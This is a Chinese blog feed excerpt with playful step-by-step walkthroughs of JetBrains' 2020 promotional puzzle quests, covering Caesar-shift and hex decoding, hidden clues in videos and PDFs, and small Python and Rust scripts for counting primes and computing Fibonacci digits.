punctuation">}</span></code></pre><p>这个含义很明显呢。就是把字符串 <code>s</code> 每个字母往前移动 n 个字符好了。（i.e. SHIFTx，凯撒密码之类的）</p><p>我也不记得 n 是多少了emmm，反正个位数吧，试一试就出来了。</p><p>于是得到</p><pre><code>We have been working 22/7 on the video for the first episode of the PhpStorm EAP. If we gave you a clue, it would be easy as pi.</code></pre><p>关键词：<strong>video</strong>，<strong>PhpStorm EAP</strong>，<strong>pi</strong>。</p><p>盲猜就与 3.14/3.1415926 之类的有关。</p><br><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>搜索 <strong>PhpStorm EAP</strong>，来到了<a href="https://www.jetbrains.com/phpstorm/nextversion/" target="_blank" rel="noopener">他的网站</a>。</p><p>噢这是个 PHP 的 IDE 啊。EAP 相当于预发布版本？</p><blockquote><p><strong>PhpStorm Early Access Program</strong></p><p>At JetBrains, we believe that to make great tools for developers, we should listen to and involve developers. Our Early Access Program (EAP) lets our development community participate in the product discussions and influence development planning, from the very early stages.</p></blockquote><p>在页面上没有找到 <code>quest</code>，也没找到视频及其链接，看了一下最新的版本是 <code>2020.1 EAP build 201.6251.26 Released: March 12, 2020</code>。</p><p>看了一下 <strong>Blog &amp; Social</strong>，来到 PHPSTORM 的 <a href="https://blog.jetbrains.com/phpstorm/" target="_blank" rel="noopener">blog</a>，看到了最新版本发布的 Post。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/PhpStorm_Blog.png" alt="PhpStorm Blog"></p><p>好了，有视频链接了！<a href="https://www.youtube.com/playlist?list=PLQ176FUIyIUb7qSArPCxOkIGX-cqdfoBx" target="_blank" rel="noopener"><em>What’s Coming in PhpStorm 2020.1</em></a></p><p>在 What’s Coming in PhpStorm 2020.1 – EAP Series | Season 2020.1 Episode 1 这个视频里，重点关注 PI 即 3’14’’ 附近的内容。</p><p>发现画面抖动了两下 emmm 有猫腻！ </p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4.png" alt="video"></p><p>猜想线索藏在抖动的位置，然而看了几遍，甚至开到最慢的 0.25 倍速，都没看出来 emmm<em>（好菜啊</em></p><p>于是找了个工具把这个视频下载下来，放 Premiere 里逐帧看。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_PR.png" alt="Premiere"></p><p>裁剪了，放大再看这1秒多的片段。最后发现 <code>homepage</code> 这里发生了变化。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_homepage.png" alt="homepage变化"></p><p>原来他的意思是 clue 在这两段抖动之间啊！</p><p>于是得到下一个链接：<a href="https://jb.gg/31415926" target="_blank" rel="noopener">https://jb.gg/31415926</a></p><p>的确与 PI 有关呢（</p><blockquote><p>有意思的是，<strong>这个视频2月10日就发布了</strong>，真是蓄谋已久啊 233333.</p><p>看评论区还有人一个月前疑惑呢。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_comments.png" alt="comments"></p></blockquote><br><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>访问 <a href="https://jb.gg/31415926" target="_blank" rel="noopener">https://jb.gg/31415926</a></p><p>301跳转到 <a href="https://www.quiz-maker.com/Q2723CE" target="_blank" rel="noopener">https://www.quiz-maker.com/Q2723CE</a></p><p>（发现这个 <a href="http://www.quiz-maker.com" target="_blank" rel="noopener">www.quiz-maker.com</a> 是个挺不错的在线 quiz 网站呢</p><blockquote><p><strong>The Easiest #1 Rated Online Quiz Maker</strong></p><p>Publish your quiz in a matter of minutes. Go ahead Try it now!</p></blockquote><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step5.png" alt="Step5"></p><p>然后需要你在 1min 内回答关于 JB 的一些问题。</p><p>（真挺好，顺便宣传一下自己。</p><p>做不对再重来，然后发现每次还有新的题目（黑脸</p><p>然后我做了好多次，发现谷歌搜索的 精选摘要 真的好用。</p><p>最后终于全对了。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step5_2.png" alt="Step5_2"></p><blockquote><p>Almost there! The last challenge is in the <em>Tips of the Day</em> of a specific IntelliJ IDEA Community version from our latest build page in Confluence, but… there is a catch. You have to know which version to look for. To find the build number, you need sight beyond sight:</p><p>. Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything.</p></blockquote><p>看来与 <em>Tips of the Day</em> of a specific IntelliJ IDEA Community version 有关，藏在每日提示里可还行，而且还是一个神秘的版本。这个版本部署在 Confluence 上面。</p><p>下面这段话有点摸不着头脑。</p><p>不管了先去 IDEA 网站上看看，难道顺便骗一波下载量？？？</p><br><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>访问 IDEA 官网，顺着 Release Notes，来到了<a href="https://confluence.jetbrains.com/collector/pages.action?key=IDEADEV" target="_blank" rel="noopener">这里</a>。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step6.png" alt="Step6"></p><p>第一个就是吧。还是几个小时前刚发布的呢！</p><p>就是这个：<a href="https://confluence.jetbrains.com/display/IDEADEV/IDEA+2020.1+Quest+Build+Edition" target="_blank" rel="noopener">IDEA 2020.1 Quest Build Edition</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step6_QuestBuildEdition.png" alt="Step6_QuestBuildEdition"></p><p>下载下来而后安装。什么，1.4GB？？？</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/IEDA_Setup.png" alt="IEDA_Setup"></p><p>随便了随便了，装完卸掉好了。（不过听说用来写 Java 挺好用的</p><p><em>（估计这里还能引一波流呢</em></p><br><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>装好了随意建一个项目，唤出 Tip of the Day.</p><p>翻了几页之后找到了。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step7.png" alt="Tip of the Day"></p><blockquote><p><strong>JETBRAINS QUEST</strong>: LAST PUZZLE</p><p><em>You have discovered our JetBrains Quest! If you don’t know what this is, you should start from the beginning.</em></p><p>This is it. The last puzzle. You are just one step away from glory!<br>Now you just need the Key to unlock the Quest page.<br>The Key is the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)).<br>As you may know by now, not all that glitters is gold, and to solve this puzzle you should not go straight for the obvious answer. May you make a glorious choice.  </p><p>Remember that you have until the 15th of March 12:00 CEST.</p></blockquote><p>所以这里要找到 <strong>the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million))</strong></p><p>即 <strong>Fibonacci 数列 50×10^6 位置的前4位和后4位</strong>。</p><p>Quest Page 就是之前的 <a href="https://www.jetbrains.com/promo/quest/" target="_blank" rel="noopener">https://www.jetbrains.com/promo/quest/</a></p><br><h2 id="Beat-the-Quest"><a href="#Beat-the-Quest" class="headerlink" title="Beat the Quest"></a>Beat the Quest</h2><p>那就算吧，前四位好算，后四位有点难顶。</p><p>搜了一下Google发现出不来。</p><p>不过懒得手撸代码算了，直接找 <a href="https://www.wolframalpha.com/" target="_blank" rel="noopener">wolframalpha</a> 吧！</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/wolframalpha.png" alt="wolframalpha"></p><p>前四位是4602。后四位的话，mod 10000出结果。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/wolframalpha2.png" alt="wolframalpha2"></p><p>得到后四位为3125。</p><p>于是 Code 就是 <code>46023125</code>啦！</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/BeatTheQuest.png" alt="BeatTheQuest"></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/ComeToAnEnd.png" alt="ComeToAnEnd"></p><p>所以最终得到的是 <strong>JB 家全家桶八折券</strong> emmmm </p><p><del>（还以为是六个月授权凑成一年的呢</del></p><p><em>不管了，反正本来就有教育授权不差这个（</em></p><p><strong>好玩就行了 23333</strong></p><p>如果你需要的话，<strong>Remember that you have until the 15th of March 12:00 CEST.</strong></p><br><h2 id="再看-Step-5-中的-Clue"><a href="#再看-Step-5-中的-Clue" class="headerlink" title="再看 Step 5 中的 Clue"></a>再看 Step 5 中的 Clue</h2><p>本来本文到这里就结束了，然后想起来之前的 clue 有点想不通，再来看看。</p><blockquote><p>. Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything.</p></blockquote><p>看了一些 V2EX 上的讨论，发现只看首字母可以拼出一句话。</p><blockquote><p>.net day call for speakers blog post image hides the next clue</p></blockquote><p>搜了一下，来到了这里。</p><p><a href="https://blog.jetbrains.com/dotnet/2020/02/13/jetbrains-net-day-online-2020-call-speakers/" target="_blank" rel="noopener">JetBrains .NET Day Online 2020 – Call for Speakers</a></p><p>在这张图片这里找到了线索。（噗</p><p><strong>you_are_looking_for_build_201-6303</strong></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/you_are_looking_for_build_201-6303.png" alt="you_are_looking_for_build_201-6303"></p><p>不过问题不大2333. 反正也找到了呢。</p><br><h2 id="Extensive-Reading"><a href="#Extensive-Reading" class="headerlink" title="Extensive Reading"></a>Extensive Reading</h2><p>再看了看<a href="https://www.v2ex.com/t/652589" target="_blank" rel="noopener">大佬们的讨论</a>，发现有大佬用 rust 写了个 <a href="https://play.rust-lang.org/?version=stable&amp;mode=release&amp;edition=2018&amp;gist=b66221ebd69b64d63feb1fe46631957b" target="_blank" rel="noopener">jio本</a> 算出了后四位。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Script_Rust.png" alt="Script_Rust"></p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> a2<span class="token punctuation">:</span> u128 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> a1<span class="token punctuation">:</span> u128 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">3</span><span class="token punctuation">..</span><span class="token operator">=</span><span class="token number">50000000</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//for i in 3..=50 {</span>        <span class="token keyword">let</span> new <span class="token operator">=</span> a2 <span class="token operator">+</span> a1<span class="token punctuation">;</span>        a2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>        <span class="token keyword">if</span> new <span class="token operator">></span> <span class="token number">10000</span> <span class="token punctuation">{</span>            a1 <span class="token operator">=</span> new <span class="token operator">%</span> <span class="token number">10000</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            a1 <span class="token operator">=</span> new<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>            <span class="token function">print!</span><span class="token punctuation">(</span><span class="token string">"\r[{}]"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"\nok: {}"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>他的思路是：</p><blockquote><p>后四位我自己写程序跑，超过四位数就减掉一万，等于只算最后四位。</p></blockquote><p>还有大佬发现了 Fib 数列是有规律的↓。</p><p><a href="http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1" target="_blank" rel="noopener">http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1</a></p><p>etc.</p><br><hr><br><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>今天是 PI 日，节日快乐呀！</p><p>最近<strong>对博客进行了一些优化</strong>，或者说是除草了，懒得开新文章写了。</p><p>主要让常用的 JavaScript、CSS、一些背景图片走 jsdelivr 的 cdn，优化一点加载速度。</p><p>然后修改了 hexo 的 feed 插件，把 RSS 中的 <code>summary</code> 优化为了文章的摘要（原来是截取全文最开始的一部分文字，还保留着一堆标签，丑死了）。期间还发现报错了，后来去 Github 参考了大佬们更新的源码改了一下模板。</p><p>这样 RSS 的效果就好多了。</p><p>欢迎大佬们关注，和我交换友链呀！</p><p><strong>RSS 地址</strong>：<a href="https://miaotony.xyz/atom.xml">https://miaotony.xyz/atom.xml</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/rss.png" alt="rss"></p><p><del>（感觉越写越水了</del></p><p>（溜了溜了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | JetBrains Quest 1&amp;2 WriteUp/攻略</title>
      <link href="/2020/03/12/CTF_2020JetBrainsQuest/"/>
      <url>/2020/03/12/CTF_2020JetBrainsQuest/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨晚在 Telegram 里看到朋友发了一个 JetBrains Quest 的 twitter 链接，据说难度不大，还可以白嫖他家的产品授权。</p><p>感兴趣就来体验一下吧！</p><p>于是体验了 Quest1 和 2 白嫖了 3+3 个月的 JB 家全产品授权，这里记录一下<strong>通关过程</strong>，也算是<strong>攻略 / WriteUp</strong> 吧。</p><p>感觉也是 CTF, Capture The Flag 的范畴吧，暂且就归类为 CTF 好了（</p><p>欢迎来和我交流哈。</p><blockquote><p><strong>PAY ATTENTION! 注意！</strong></p><p>如果没有玩过的话</p><p style="color:red">本文下面的内容 <strong>全 是 剧 透</strong>！</p><p><strong>如果想自己做的话，就暂时不要往下看了！</strong></p></blockquote><p>这个 Quest <strong>在 2020-03-15 12:00 CET （欧洲中部时间）之前都有效</strong>。</p><br><h2 id="Quest-1"><a href="#Quest-1" class="headerlink" title="Quest 1"></a>Quest 1</h2><p><a href="https://twitter.com/jetbrains/status/1236986174075482113" target="_blank" rel="noopener">https://twitter.com/jetbrains/status/1236986174075482113</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Quest1.png" alt="Quest1"></p><pre><code>48 61 76 65 20 79 6f 75 20 73 65 65 6e 20 74 68 65 20 73 6f 75 72 63 65 20 63 6f 64 65 20 6f 66 20 74 68 65 20 4a 65 74 42 72 61 69 6e 73 20 77 65 62 73 69 74 65 3f</code></pre><p>一看是 hex，于是转成 ASCII，得到：</p><pre><code>Have you seen the source code of the JetBrains website?</code></pre><br><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>去官网上找呗。传送门：<a href="https://www.jetbrains.com/" target="_blank" rel="noopener">https://www.jetbrains.com/</a></p><p>（还别说，挺久没上 JetBrains 官网了，感觉又多了不少工具，界面也变得更好看了唉。</p><p>提示了看源码，既然是 <code>JetBrainsQuest</code> 了，当然就<strong>搜一下<code>quest</code></strong>。</p><p>果然看到了提示。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-1.png" alt="Step1"></p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--      O{o)xxx|===============-      OWelcome to the JetBrains Quest.What awaits ahead is a series of challenges. Each one will require a little initiative, a little thinking, and a whole lot of JetBrains to get to the end. Cheating is allowed and in some places encouraged. You have until the 15th of March at 12:00 CET to finish all the quests.Getting to the end of each quest will earn you a reward.Let the quest commence!JetBrains has a lot of products, but there is one that looks like a joke on our Products page, you should start there... (hint: use Chrome Incognito mode)It’s dangerous to go alone take this key: Good luck! == Jrrg#oxfn$                 O-===============|xxx(o}                 O--></span></code></pre><p>这里提示了<code>hint: use Chrome Incognito mode</code>。</p><p><strong>建议用 Chrome 的无痕模式。</strong></p><br><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>于是就<strong>去 products 里找</strong>了呗。</p><p>（可能没注意）没找到入口，盲猜就在 <code>/products</code> 目录了，访问后跳转到了 <a href="https://www.jetbrains.com/products.html" target="_blank" rel="noopener">https://www.jetbrains.com/products.html</a> 。</p><blockquote><p>后来发现主页上的链接在 <a href="https://www.jetbrains.com/products.html" target="_blank" rel="noopener">See All Tools</a> 里（</p></blockquote><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/products.png" alt="products"></p><p>找找哪个<code>looks like a joke</code>，一猜就是 <strong>JK</strong> 了，而且还是2020.1.1版本（嘻嘻 。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-2.png" alt="Step2"></p><blockquote><p>后来发现，JK 这个产品可能需要在 <strong>无痕模式/隐私模式</strong> 下才出现。（有可能有缓存？</p><p>后面再来分析一下这个怎么加载出来的8.</p></blockquote><br><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p><strong>找一下 500 到 5000 之内有多少素数</strong>，随手写个 py 的 jio 本。</p><p>（边界值的话，5000肯定不是素数，不影响结果</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> sqrtcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> int<span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cnt <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'OK!'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span></code></pre><p>跑出来 <code>cnt</code> 为 574.</p><p>于是访问 <a href="https://jb.gg/574" target="_blank" rel="noopener">https://jb.gg/574</a> .<em>（不输入的话是跳转到官网的</em></p><p><em>（其实爆破也行，反正就三位数呢</em></p><p>发现 301 重定向到了 <a href="https://www.jetbrains.com/help/pycharm/getting-help.html#quest" target="_blank" rel="noopener">https://www.jetbrains.com/help/pycharm/getting-help.html#quest</a> 。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-3.png" alt="Step3"></p><br><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>Google 上一搜就是了。</p><p>（下面还有 V2EX 上别人的讨论 </p><p><small><em>（（不看不看先不看！</em></small></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/MPS-31816.png" alt="MPS-31816"></p><p><a href="https://youtrack.jetbrains.com/issue/MPS-31816" target="_blank" rel="noopener">https://youtrack.jetbrains.com/issue/MPS-31816</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-4.png" alt="Step4"></p><p>这是 YouTrack 的一个 issue。<em>（这里直接谷歌可能是非预期解了</em></p><pre><code>JetBrains Quest“The key is to think back to the beginning.” – The JetBrains Quest teamQlfh$#Li#|rx#duh#uhdglqj#wklv#|rx#pxvw#kdyh#zrunhg#rxw#krz#wr#ghfu|sw#lw1#Wklv#lv#rxu#lvvxh#wudfnhu#ghvljqhg#iru#djloh#whdpv1#Lw#lv#iuhh#iru#xs#wr#6#xvhuv#lq#Forxg#dqg#iru#43#xvhuv#lq#Vwdqgdorqh/#vr#li#|rx#zdqw#wr#jlyh#lw#d#jr#lq#|rxu#whdp#wkhq#zh#wrwdoo|#uhfrpphqg#lw1#|rx#kdyh#ilqlvkhg#wkh#iluvw#Txhvw/#qrz#lw“v#wlph#wr#uhghhp#|rxu#iluvw#sul}h1#Wkh#frgh#iru#wkh#iluvw#txhvw#lv#‟WkhGulyhWrGhyhors†1#Jr#wr#wkh#Txhvw#Sdjh#dqg#xvh#wkh#frgh#wr#fodlp#|rxu#sul}h1#kwwsv=22zzz1mhweudlqv1frp2surpr2txhvw2</code></pre><p>结合 Step1 中的 <code>Good luck! == Jrrg#oxfn$</code>，分析可知是<strong>往后移了3个字符（SHIFT3）</strong>。</p><p>于是全部往前移3个字符得到：</p><pre><code>Nice! If you are reading this you must have worked out how to decrypt it. This is our issue tracker designed for agile teams. It is free for up to 3 users in Cloud and for 10 users in Standalone, so if you want to give it a go in your team then we totally recommend it. you have finished the first Quest, now it…s time to redeem your first prize. The code for the first quest is &lt;TheDriveToDevelop&lt;. Go to the Quest Page and use the code to claim your prize. https://www.jetbrains.com/promo/quest/</code></pre><br><h3 id="Beat-The-Quest"><a href="#Beat-The-Quest" class="headerlink" title="Beat The Quest"></a>Beat The Quest</h3><p>Rua！哇好耶！</p><p><code>TheDriveToDevelop</code></p><p>然后就可以拿着这个 code 去白嫖免费授权了！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success.png" alt="success"></p><p>输入邮箱和上面的 Code，提交就好啦。</p><blockquote><p>这里看到 Twitter 上有人说 Firefox 会报 CORS issue，请使用 Chrome 试试。</p><p><em>(An error occurred while …</em></p></blockquote><p>这里说了会把你的信息提供给他，他会给你的邮箱发推荐信息，可能这是 JetBrains 吸收流量的一个手段吧<em>（盲猜的</em></p><p>不过他也说了在邮件末尾可以取消订阅。</p><blockquote><p>BTW，发现这里的 Code 并没有上传到后端进行校验，而是直接在前端进行的。</p><p><em>可以给 Code 输入框的 input 打个断点看看（</em></p><p><em>（或者看看提交表格的 call stack 好了</em></p></blockquote><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success2.png" alt="success2"></p><p>于是得到了白嫖的 <strong>3-months free All Products Pack subscription</strong>。</p><p>有点意思唉~</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success3.png" alt="success3"></p><p>等等？<strong>还没完唉！</strong></p><p><strong>这是一系列的 Quest！</strong></p><p>下一个 quest 的时间是<strong>1583924400</strong>，转换时间戳发现是 <strong>2020-03-11 19:00:00</strong>.</p><p><br><br></p><h3 id="Step2-中-JK-的加载分析"><a href="#Step2-中-JK-的加载分析" class="headerlink" title="Step2 中 JK 的加载分析"></a>Step2 中 JK 的加载分析</h3><p>突然有点好奇这个 JK 是怎么被加载出来的，于是简单分析一下吧。</p><p>这里搜索<code>quest</code>，在网页末尾处看到了一个加载的<code>dialog-polyfill.js</code>。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis.png" alt="Elements"></p><p>在 Sources 里这个文件里搜索 <code>JK</code>或者<code>quest</code>，都找不到网页上与 JK 有关信息，倒是定义了一堆相关的属性方法之类的，css 文件中是<code>dialog</code>框的相关样式。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis2.png" alt="dialogJS"></p><p>在 Network 里看 <code>products.html</code> 的 response，里面并没有 <code>JK</code>，也没有<code>quest</code>。就连上面这个脚本文件也没有。</p><p><strong>那这个 JK 到底是怎么加载出来的呢？</strong></p><p>于是<strong>在 Network 里全局搜索了一下 <code>quest</code></strong>，有了新的收获。</p><p>原来这些信息都是<strong>通过一个JS脚本来加载</strong>的。</p><p>这个 js 的 response 包含了页面上的所有产品信息，是把网页内容嵌入到 json 里进行数据交互的。</p><p>哇，第一次见唉！😂</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis3.png" alt="Network"></p><p>再看一下 Initiator，发现调用了 Googletagmanager，这是什么东西唉，之前爬虫虫也没遇到过（又是我知识盲区了</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis4.png" alt="call stack"></p><p>查了一下，是谷歌的标签管理器，都诞生挺久了然而并不知道。</p><blockquote><p><em>Google Tag Manager</em> helps make website tag management simple with tools &amp; solutions that allow small businesses to deploy and edit tags all in one place.</p><p>这里是<a href="https://tagmanager.google.com/" target="_blank" rel="noopener">他的官网</a>。</p></blockquote><p>上去看了一下，感觉就是可以动态修改前端的代码，不用直接修改原本的网站文件，不需要重新部署。而且还自带版本管理，可以多人合作之类的吧。</p><p>谷歌的统计也是用这个来实现的。</p><p>不过有个缺点是，国内访问比较慢而且说不定哪天就连接不上了。</p><p>emmm 后面有空感兴趣再折腾吧（</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/googletagmanager.png" alt="googletagmanager"></p><br><hr><br><h2 id="Quest-2"><a href="#Quest-2" class="headerlink" title="Quest 2"></a>Quest 2</h2><p>来了来了！第二个 Quest 来了！</p><p><a href="https://twitter.com/jetbrains/status/1237694815283879943" target="_blank" rel="noopener">https://twitter.com/jetbrains/status/1237694815283879943</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Quest2.png" alt="Quest2"></p><pre><code>.spleh A+lrtC/dmC .thgis fo tuo si ti semitemos ,etihw si txet nehw sa drah kooL .tseretni wohs dluohs uoy ecalp a si ,dessecorp si xat hctuD erehw esac ehT .sedih tseuq fo txen eht erehw si ,deificeps era segaugnal cificeps-niamod tcudorp ehT</code></pre><p>很明显倒叙了，这里反过来得到：</p><pre><code>The product domain-specific languages are specified, is where the next of quest hides. The case where Dutch tax is processed, is a place you should show interest. Look hard as when text is white, sometimes it is out of sight. Cmd/Ctrl+A helps.</code></pre><p>提示了是个与 <code>domain-specific languages</code>有关的产品，quest相关的文字设置为白色的了。</p><br><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>谷歌搜一下，直接就得到了 JetBrains 家的 <strong>MPS</strong> (MetaProgrammingSystem)   <em>（之前也没了解过</em></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-1.png" alt="谷歌搜索结果"></p><p>访问它的官网吧，传送喵：<a href="https://www.jetbrains.com/mps/" target="_blank" rel="noopener">https://www.jetbrains.com/mps/</a></p><br><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>在网页里同样搜一下 <code>quest</code></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-2.png" alt="网页里找到pdf"></p><p>发现有个 PDF 文件唉~</p><p>打开来看看吧！</p><br><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>于是继续在 PDF 里搜索<code>quest</code>。</p><p>发现果然是白色的文字23333.</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-3.png" alt="Step3"></p><p>Ctrl + A ，Ctrl + C / V，看一下那一块的文字</p><pre><code>This is our 20th year as a company,we have shared numbers in our JetBrainsAnnual report, sharing the section with18,650 numbers will progress your quest</code></pre><br><h3 id="Step-4-1"><a href="#Step-4-1" class="headerlink" title="Step 4"></a>Step 4</h3><p>上面提示了JB 20周年年度报告，想起来官网首页上有个链接来着。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/20Years.png" alt="20周年"></p><p><a href="https://www.jetbrains.com/company/annualreport/2019/" target="_blank" rel="noopener">https://www.jetbrains.com/company/annualreport/2019/</a></p><p>插几句题外话。</p><p>就是个年报吧，看上去 JB 的确挺受欢迎哒！（PyCharm 真挺好用的</p><p>下面这个视频封面的小黄鸭让我想到了 <strong>小黄鸭调试法</strong> 23333</p><p>（这个 <code>Dogfooding</code> 用的有点意思</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/20Years2.png" alt=""></p><p>这回再来搜索 <code>quest</code>。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-4.png" alt="Step4"></p><p>第七届 Hackathon。（emmm</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>react-js-quick-share<span class="token punctuation">"</span></span> <span class="token attr-name">data-hashtag</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>JetBrainsQuest<span class="token punctuation">"</span></span> <span class="token attr-name">data-text</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>I have found the JetBrains Quest! Sometimes you just need to look closely at the Haskell language, Hello,World! in the hackathon lego brainstorms project https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/<span class="token punctuation">"</span></span> <span class="token attr-name">data-theme</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dark<span class="token 